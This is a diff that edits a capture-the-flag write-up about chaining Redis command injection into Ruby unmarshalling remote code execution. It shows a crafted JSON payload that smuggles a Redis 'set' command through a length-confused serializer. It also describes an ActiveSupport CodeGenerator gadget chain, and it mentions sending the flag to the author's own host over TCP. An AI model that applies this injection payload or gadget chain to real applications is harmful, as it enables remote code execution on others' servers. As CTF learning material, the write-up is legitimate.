@@ -16,9 +16,9 @@ The redis command serializer assumes that it will receive a norrmal flat bytelik
 exploit = {"sha": {"to_s": { "to_s": { "to_s": { "b":{
            "to_s":f"AA\r\n$2\r\nPX\r\n$2\r\n10\r\n*5\r\n$3\r\nset\r\n${len(target)}\r\n{target}\r\n${len(payload)}\r\n{payload}\r\n$2\r\nPX\r\n$6\r\n300000\r\n",
             "bytesize":2
-            }}}}},"tree": [{"path":"pwnedbyPFS"}]}```
-
-Here, I'm invoking a `set` command. 
+            }}}}},"tree": [{"path":"pwnedbyPFS"}]}
+```
+The serializer will process the length of the innermost string as `2` but insert the entire string into the command. By completing the remaining fields as part of our input, then starting a new command with the `*` character, we can inject additional commands. Here, I'm invoking a `set` command. Once we have command injection, we still need some way of gaining additional control to read the flag from disk. 
 
 The redis connector is invoked with `raw: True` for both directly controlled fields, but there's a third value stored for every connection which doesn't have that
 
@@ -30,7 +30,7 @@ The redis connector is invoked with `raw: True` for both directly controlled fie
   end
 ```
 
-Values fetched without `raw: True` will be unmarshalled, leading to a classic ruby unmarshalling exploit. We can use redis injection to set our `session_id` in the redis server to controlled data, then trigger it to be unmarshalled
+Values fetched without `raw: True` will be unmarshalled, leading to a classic ruby unmarshalling exploit. We can use redis injection to set our `session_id` in the redis server to controlled data, then trigger it to be unmarshalled.
 
 I wasted a _ton_ of time once I got to this point, but I  didn't really know what I was doing. I'll try to explain ruby unmarshalling best I can, but there are [numerous](https://bishopfox.com/blog/ruby-vulnerabilities-exploits) [other](https://www.elttam.com/blog/ruby-deserialization/) [resources](https://devcraft.io/2022/04/04/universal-deserialisation-gadget-for-ruby-2-x-3-x.html) [worth](https://github.com/haileys/old-website/blob/master/posts/rails-3.2.10-remote-code-execution.md) [reading](https://github.com/httpvoid/writeups/blob/main/Ruby-deserialization-gadget-on-rails.md).
 
@@ -98,7 +98,7 @@ def apply(owner, path, line)
 end
 ```
 
-We can't invoke the `apply` method directly, but examining the surrounding code we can instantiate an `ActiveSupport::CodeGenerator` and it's child `MethodSet` and invoke `execute` on the `CodeGenerator`:
+We can't invoke the `apply` method directly (as it requires three arguments), but examining the surrounding code we can instantiate an `ActiveSupport::CodeGenerator` and it's child `MethodSet` and invoke `execute` on the `CodeGenerator`:
 
 ```ruby
 def execute
@@ -107,6 +107,8 @@ def execute
   end
 end
 ```
+
+From here, exploitation is simple, as we have arbitrary ruby. I chose to open a TCP connection to my host, and dump the flag out, rather than trying to inject it into the HTTP response or invoking shell commands.
 
 Here's my code to generate the payload:
 
